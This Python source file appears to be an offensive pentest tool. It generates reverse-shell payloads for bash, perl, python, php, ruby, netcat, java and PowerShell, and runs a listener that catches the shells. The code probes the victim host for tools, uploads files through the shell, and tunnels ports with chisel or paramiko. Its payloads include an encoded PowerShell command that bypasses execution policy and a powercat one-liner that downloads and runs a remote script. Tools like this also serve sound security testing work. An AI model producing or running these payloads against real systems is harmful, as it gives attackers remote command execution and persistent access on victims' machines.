#!/usr/bin/python

import socket
import os
import re
import sys
import pty
import util
import upload_file
import time
import random
import threading
import paramiko
import base64
import select
import argparse


try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer

class ShellListener:

    def __init__(self, addr, port):
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind_addr = addr
        self.port = port
        self.verbose = False
        self.on_message = []
        self.listen_thread = None
        self.connection = None
        self.on_connect = None
        self.features = set()
        self.shell_ready = False 
        self.os = None # we need a way to find the OS here

    def startBackground(self):
        self.listen_thread = threading.Thread(target=self.start)
        self.listen_thread.start()
        return self.listen_thread

    def has_feature(self, feature):
        return feature.lower() in self.features

    def probe_features(self):
        if self.os == "unix":
            features = ["wget", "curl", "nc", "sudo", "telnet", "docker", "python"]
            for feature in features:
                output = self.exec_sync("whereis " + feature)
                if output.startswith(feature.encode() + b": ") and len(output) >= len(feature)+2:
                    self.features.add(feature.lower())
        else:
            print("[-] Can't probe features for os:", self.os)
            
    def get_features(self):
        return self.features

    def start(self):
        self.running = True
        self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_socket.bind((self.bind_addr, self.port))
        self.listen_socket.listen()
        while self.running:
            self.connection, addr = self.listen_socket.accept()
            with self.connection:
                print("[+] Got connection:", addr)

                if self.on_connect:
                    self.on_connect(addr)
          
                self.shell_ready = False
                while self.running:
                    data = self.connection.recv(1024)
                    if not data:
                        break
                    
                    if self.os is None and not self.shell_ready:
                        if b"Windows PowerShell" in data or b"Microsoft Windows" in data:
                            self.os = "win"
                        elif b"bash" in data or b"sh" in data:
                            self.os = "unix"
                        
                        if self.os and self.verbose:
                            print("OS PROBED:", self.os)

                    if self.verbose:
                        print("< ", data)

                    if self.shell_ready:  # TODO: check this...
                        for callback in self.on_message:
                            callback(data)
                    elif self.is_prompt(data):
                        self.shell_ready = True
                        if self.verbose:
                            print("RECV first prompt")

            print("[-] Disconnected")
            self.connection = None
            self.running = False

    def close(self):
        self.running = False
        self.sendline("exit")
        self.listen_socket.close()
        if self.listen_thread != threading.currentThread():
            self.listen_thread.join()

    def send(self, data):
        if self.connection:
            if isinstance(data, str):
                data = data.encode()

            if self.verbose:
                print("> ", data)

            self.connection.sendall(data)

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        return self.send(data)

    def is_prompt(self, data):
        if self.os == "unix":
            if data.endswith(b"# ") or data.endswith(b"$ "):
                return True
        elif self.os == "win":
            if data.endswith(b"> ") or data.endswith(b">") or data.endswith(b"$ "):
                return True
        
        return False

    def exec_sync(self, cmd):

        if self.os is None:
            print("[-] OS not probed yet, waiting...")
            while self.os is None:
                time.sleep(0.1)
        if not self.shell_ready:
            print("[-] Shell not ready yet, waiting...")
            while not self.shell_ready:
                time.sleep(0.1)

        output = b""
        complete = False

        if isinstance(cmd, str):
            cmd = cmd.encode()

        def callback(data):
            nonlocal output
            nonlocal complete

            if complete:
                return

            output += data
            if self.is_prompt(output):
                complete = True
                if self.os == "unix":
                    line_ending = b"\n"
                elif self.os == "win":
                    line_ending = b"\r\n"

                if line_ending in output:
                    output = output[0:output.rindex(line_ending)]
                if output.startswith(cmd + line_ending):
                    output = output[len(cmd)+len(line_ending):]                
        
        self.on_message.append(callback)
        self.sendline(cmd)
        while not complete:
            time.sleep(0.1)
        
        self.on_message.remove(callback)
        return output

    def print_message(self, data):
        try:
            data = data.decode()
        except:
            data = str(data)  # workaround so the shell doesn't die 
        sys.stdout.write(data)
        sys.stdout.flush()

    def interactive(self):
        print("[ ] Switching to interactive mode")
        self.on_message.append(lambda x: self.print_message(x))
        while self.running and self.connection is not None:
            self.sendline(input())

    def wait(self):
        while self.running and self.connection is None:
            time.sleep(0.1)
        return self.running

    def get_cwd(self):
        if self.os == "unix":
            return self.exec_sync("pwd").decode()
        elif self.os == "win":
            return self.exec_sync("pwd | foreach {$_.Path}").decode()
        else:
            print("[-] get_cwd not implemented for os:", self.os)
            return None

    def write_file(self, path, data_or_fd, permissions=None, method=None, sync=False, **kwargs):

        if method == None:
            if self.os == "win":
                method = "powershell"
            elif self.os == "unix":
                method = "echo"
        else:
            print("[-] No method specified, assuming 'echo'")
            method = echo

        print(f"[ ] Writing file '{path}' using method: {method}")
        send_func = self.sendline if not sync else self.exec_sync

        def write_chunk(chunk, first=False):
            chunk = base64.b64encode(chunk).decode()
            if method == "powershell":
                send_func(f"$decodedBytes = [System.Convert]::FromBase64String('{chunk}')")
                send_func(f"$stream.Write($decodedBytes, 0, $decodedBytes.Length)")
            else:
                operator = ">" if first else ">>"
                send_func(f"echo {chunk}|base64 -d {operator} {path}")

        if method == "echo" or method == "powershell":

            if method == "powershell":
                path = path.replace("'","\\'")
                send_func(f"$stream = [System.IO.File]::Open('{path}', [System.IO.FileMode]::Create)")

            chunk_size = 1024
            if hasattr(data_or_fd, "read"):
                first = True
                while True:
                    data = data_or_fd.read(chunk_size)
                    if not data:
                        break
                    if isinstance(data, str):
                        data = data.encode()
                    write_chunk(data, first)
                    first = False
                data_or_fd.close()
            else:
                if isinstance(data_or_fd, str):
                    data_or_fd = data_or_fd.encode()
                for offset in range(0, len(data_or_fd), chunk_size):
                    write_chunk(data_or_fd[offset:offset+chunk_size], offset == 0)
                    
            if method == "powershell":
                send_func(f"$stream.Close()")

        elif method == "nc" or method == "netcat":
            ip_addr = util.get_address()
            bin_path = "nc" if not "bin_path" in kwargs else kwargs["bin_path"]
            port = None if "listen_port" not in kwargs else int(kwargs["listen_port"])
            sock = util.open_server(ip_addr, port, retry=False)
            if not sock:
                return False
            
            def serve_file():
                upload_file.serve_file(sock, data_or_fd, forever=False)

            port = sock.getsockname()[1]
            upload_thread = threading.Thread(target=serve_file)
            upload_thread.start()
            send_func(f"{bin_path} {ip_addr} {port} > {path}")
            upload_thread.join()
        else:
            print("[-] Unknown write-file method:", method)
            return False

        if permissions and self.os == "unix":
            send_func(f"chmod {permissions} {path}")
        
        print("[+] Done!")

class ParamikoTunnelServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class ParamikoTunnel:
    def __init__(self, shell, ports):
        self.shell = shell
        self.ports = ports
        self.verbose = False
        self.is_running = True
        self.on_message = []
        self.listen_threads = []
        self.servers = []

    def start_background(self):
        for port in self.ports:
            thread = threading.Thread(target=self.start, args=(port, ))
            thread.start()
            self.listen_threads.append(thread)
        return self.listen_threads

    def start(self, port):
        this = self
        class SubHandler(ParamikoTunnelHandler):
            peer = this.shell.get_transport().sock.getpeername()
            chain_host = "127.0.0.1"
            chain_port = port
            ssh_transport = this.shell.get_transport()
            def log(self, message):
                if this.verbose:
                    print(message)

        forward_server = ParamikoTunnelServer(("127.0.0.1", port), SubHandler)
        self.servers.append(forward_server)
        forward_server.serve_forever()

    def close(self):
        self.is_running = False
        for server in self.servers:
            server._BaseServer__shutdown_request = True
        for thread in self.listen_threads:
            thread.join()

class ParamikoTunnelHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            self.log(
                "Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return
        if chan is None:
            self.log(
                "Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return

        self.log(
            "Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        self.log("Tunnel closed from %r" % (peername,))

def generate_payload(payload_type, local_address, port, index=None, **kwargs):

    commands = []
    shell = kwargs.get("shell", "/bin/bash")

    if payload_type == "bash":
        payload = f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1"
    elif payload_type == "perl":
        payload = f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/{shell} -i\");}};'"
        payload = f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    elif re.match(r"python((2|3)(\.[0-9]+)?)?", payload_type):
        payload = f"{payload_type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/{shell}\",\"-i\"]);'"
    elif payload_type == "php":
        payload = f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/{shell} -i <&3 >&3 2>&3\");'"
    elif payload_type == "ruby":
        payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'"
    elif payload_type in ["netcat", "nc", "ncat"]:
        method = kwargs.get("method", "fifo")
        if method == "fifo":
            fifo_name = kwargs.get("fifo_name", "f")
            payload = f"rm /tmp/{fifo_name};mkfifo /tmp/{fifo_name};cat /tmp/{fifo_name}|{shell} -i 2>&1|{payload_type} {local_address} {port} >/tmp/{fifo_name}"    
        else:
            payload = f"{payload_type} {local_address} {port} -e {shell}"
    elif payload_type == "java":
        payload = f"r = Runtime.getRuntime()\np = r.exec([\"{shell}\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
    elif payload_type == "xterm":
        payload = f"xterm -display {local_address}:1"
    elif payload_type == "powercat":
        shell = kwargs.get("shell", "cmd")
        http_port = kwargs.get("http_port", 80)
        return f"powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{local_address}:{http_port}/powercat.ps1');powercat -c {local_address} -p {port} -e {shell}\""
    elif payload_type == "powershell":
        payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
        if kwargs.get("method", "process") == "process":
            payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
            execution_policy = kwargs.get("execution_policy", "bypass")
            flags = ["-EncodedCommand", payload_encoded]
            if execution_policy is not None:
                flags.append("-ExecutionPolicy")
                flags.append(execution_policy)
            flags = " ".join(flags)
            payload = f"powershell.exe {flags}"
    else:
        payload = None
        print("[-] Unknown payload type:", payload_type)

    return payload

def spawn_listener(port):
    pty.spawn(["nc", "-lvvp", str(port)])

def wait_for_connection(listener, timeout=None, prompt=True):
    start = time.time()
    if prompt:
        prompt = prompt if type(prompt) == str else "[ ] Waiting for shell"
        if timeout is not None:
            timer_len = sys.stdout.write("\r%s: %ds\r" % (prompt, timeout))
            sys.stdout.flush()
        else:
            print(prompt)

    while listener.connection is None and listener.running:
        time.sleep(0.5)
        if timeout is not None:
            diff = time.time() - start
            if diff < timeout:
                sys.stdout.write(util.pad(f"\r%s: %ds" % (prompt, timeout - diff), timer_len, " ") + "\r")
                sys.stdout.flush()
            else:
                print(util.pad("\r[-] Shell timeout :(", timer_len, " ") + "\r")
                return None
    
    return listener

def spawn_background_shell(port, timeout=None, prompt=True):
    listener = ShellListener("0.0.0.0", port)
    listener.startBackground()
    wait_for_connection(listener, timeout, prompt)
    return listener

def trigger_shell(func, port):
    def _wait_and_exec():
        time.sleep(1.5)
        func()

    threading.Thread(target=_wait_and_exec).start()
    spawn_listener(port)

def trigger_background_shell(func, port, timeout=None, prompt=True):   
    listener = ShellListener("0.0.0.0", port)
    listener.startBackground()
    threading.Thread(target=func).start()
    wait_for_connection(listener, timeout, prompt)
    return listener

def create_tunnel(shell, ports: list):
    if len(ports) == 0:
        print("[-] Need at least one port to tunnel")
        return
    
    # TODO: ports

    if isinstance(shell, ShellListener):
        # TODO: if chisel has not been transmitted yet
        # we need a exec sync function, but this requires guessing when the output ended or we need to know the shell prompt
        ipAddress = util.get_address()
        chiselPort = 3000
        chisel_path = os.path.join(os.path.dirname(__file__), "chisel64")
        shell.write_file("/tmp/chisel64", open(chisel_path, "rb"))
        shell.sendline("chmod +x /tmp/chisel64")

        t = threading.Thread(target=os.system, args=(f"{chisel_path} server --port {chisel_port} --reverse", ))
        t.start()

        shell.sendline(f"/tmp/chisel64 client --max-retry-count 1 {ipAddress}:{chiselPort} {ports} 2>&1 >/dev/null &")
        return t
    elif isinstance(shell, paramiko.SSHClient):

        paramiko_tunnel = ParamikoTunnel(shell, ports)
        paramiko_tunnel.start_background()
        return paramiko_tunnel

        # TODO: https://github.com/paramiko/paramiko/blob/88f35a537428e430f7f26eee8026715e357b55d6/demos/forward.py#L103
        pass

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Reverse shell generator")
    parser.add_argument(dest="type", type=str, default=None, help="Payload type")
    parser.add_argument("--port", type=int, required=False, default=None, help="Listening port")
    parser.add_argument("--addr", type=str, required=False, default=util.get_address(), help="Listening address")
    args, extra = parser.parse_known_args()

    listen_port = args.port
    payload_type = args.type.lower()
    local_address = args.addr
    extra_args = {}

    for entry in extra:
        match = re.match(r"(\w+)=(\w+)", entry)
        if not match:
            print("Invalid extra argument:", entry)
            exit()
        key, value = match.groups()
        extra_args[key] = value

    # choose random port
    if listen_port is None:
        listen_port = random.randint(10000,65535)
        while util.is_port_in_use(listen_port):
            listen_port = random.randint(10000,65535)

    payload = generate_payload(payload_type, local_address, listen_port, **extra_args)

    if payload is None:
        print("Unknown payload type: %s" % payload_type)
        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
        exit(1)

    tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    print("---PAYLOAD---\n%s\n---TTY---\n%s\n---------\n" % (payload, tty))

    if payload_type == "xterm":
        print("You need to run the following commands (not tested):")
        print("xhost +targetip")
        print("Xnest :1")
    else:
        pty.spawn(["nc", "-lvvp", str(listen_port)])
